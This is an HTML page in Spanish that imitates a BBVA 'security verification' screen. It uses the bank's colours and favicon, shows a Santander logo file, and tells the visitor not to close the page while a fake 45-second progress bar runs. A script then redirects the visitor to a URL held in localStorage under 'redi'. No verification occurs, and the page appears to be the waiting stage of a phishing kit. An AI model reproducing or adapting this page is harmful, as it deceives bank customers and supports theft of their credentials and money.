<!DOCTYPE html>
<html lang="es">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificación de Seguridad - BBVA</title>
  <link rel="shortcut icon" type="image/x-icon" href="https://www.BBVA.com/favicon.ico">

  <!-- Fuente -->
  <link href="./index_files/css2" rel="stylesheet">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="./index_files/all.min.css"
    integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw=="
    crossorigin="anonymous" referrerpolicy="no-referrer">
  <style>
    :root {
      --BBVA-blue: #001391;
      --BBVA-blue-dark: #001170;
      --BBVA-blue-light: #3339ff;
      --gray-light: #f0f2f5;
      --gray-border: #e9edef;
      --gray-text: #667781;
      --transition: all 0.3s ease;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body,
    html {
      height: 100%;
      width: 100%;
      font-family: "BBVAHeadline", Helvetica, Arial, sans-serif;
      color: #111;
      overflow: hidden;
    }

    body {
      font-family: "BBVAHeadline", Tahoma, Geneva, Verdana, sans-serif;

      background: linear-gradient(135deg,
          #001391 0%,
          #3339ff 50%,
          #001391 100%);
      background-size: cover;
      margin: 0;
      display: flex;
      height: 100vh;
      justify-content: center;
      align-items: center;
      position: relative;
      width: 100vw;
    }

    /* Fondo animado */
    .background-shapes {
      position: fixed;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      z-index: 0;
      overflow: hidden;
    }

    .shape {
      position: absolute;
      opacity: 0.3;
      border-radius: 50%;
    }

    .shape1 {
      width: 400px;
      height: 400px;
      background: linear-gradient(45deg, #3339ff, #001391);
      top: -200px;
      left: -200px;
      animation: float 20s ease-in-out infinite;
    }

    .shape2 {
      width: 300px;
      height: 300px;
      background: linear-gradient(45deg, #48dbfb, #0abde3);
      bottom: -150px;
      right: -150px;
      animation: float 15s ease-in-out infinite reverse;
    }

    .shape3 {
      width: 200px;
      height: 200px;
      background: linear-gradient(45deg, #5f27cd, #341f97);
      top: 50%;
      right: 10%;
      animation: float 18s ease-in-out infinite;
    }

    @keyframes float {

      0%,
      100% {
        transform: translateY(0) rotate(0deg);
      }

      50% {
        transform: translateY(-30px) rotate(180deg);
      }
    }

    .verification-container {
      width: 90%;
      max-width: 460px;
      z-index: 10;
      animation: fadeInUp 0.6s ease-out;
    }

    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }

      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .verification-box {
      background: white;
      border-radius: 16px;
      padding: 40px 35px;
      box-shadow: 0 8px 40px rgba(0, 0, 0, 0.12);
      text-align: center;
      position: relative;
    }

    #loadingImage {
      width: 180px;
      margin-bottom: 20px;
    }

    h2 {
      font-size: 22px;
      font-weight: 600;
      margin-bottom: 8px;
      color: #111;
    }

    p {
      font-size: 15px;
      color: var(--gray-text);
      margin-bottom: 20px;
    }

    progress {
      width: 100%;
      height: 10px;
      appearance: none;
      border-radius: 8px;
      overflow: hidden;
    }

    progress::-webkit-progress-bar {
      background-color: #e0e0e0;
    }

    progress::-webkit-progress-value {
      background: linear-gradient(135deg, #001391 0%, #001170 100%);
    }

    progress::-moz-progress-bar {
      background: linear-gradient(135deg, #001391 0%, #001170 100%);
    }

    strong {
      color: #001391;
    }
  </style>
</head>

<body>
  <!-- Inserted by miarroba -->
  <div class="background-shapes">
    <div class="shape shape1"></div>
    <div class="shape shape2"></div>
    <div class="shape shape3"></div>
  </div>

  <div class="verification-container">
    <div class="verification-box">
      <img src="./index_files/logo_santander_rojo.svg" alt="Cargando" id="loadingImage">
      <h2>Verificando tu información</h2>
      <p>No cierres esta página</p>
      <progress id="progressBar" value="20" max="100"></progress>
      <p id="countdownText">Por favor espera <strong>36</strong></p>
    </div>
  </div>
  <script>
    const TOTAL_TIME = 45; // segundos

    const progressBar = document.getElementById("progressBar");
    const countdownText = document.getElementById("countdownText");

    progressBar.value = 0;

    // Guardamos el instante exacto en que inicia el conteo
    const startTime = Date.now();

    const interval = setInterval(() => {
      // Segundos reales transcurridos
      const elapsedSeconds = Math.floor((Date.now() - startTime) / 1000);
      let timeLeft = TOTAL_TIME - elapsedSeconds;

      if (timeLeft < 0) timeLeft = 0;

      // Progreso según el tiempo REAL que pasó
      const progress = (elapsedSeconds / TOTAL_TIME) * 100;
      progressBar.value = Math.min(progress, 100);

      countdownText.innerHTML = `Por favor espera <strong>${timeLeft}</strong>`;

      if (timeLeft <= 0) {
        clearInterval(interval);
        window.location.href = localStorage.getItem('redi');
      }
    }, 300); // el intervalo ya no es crítico
  </script>

</body>

</html>
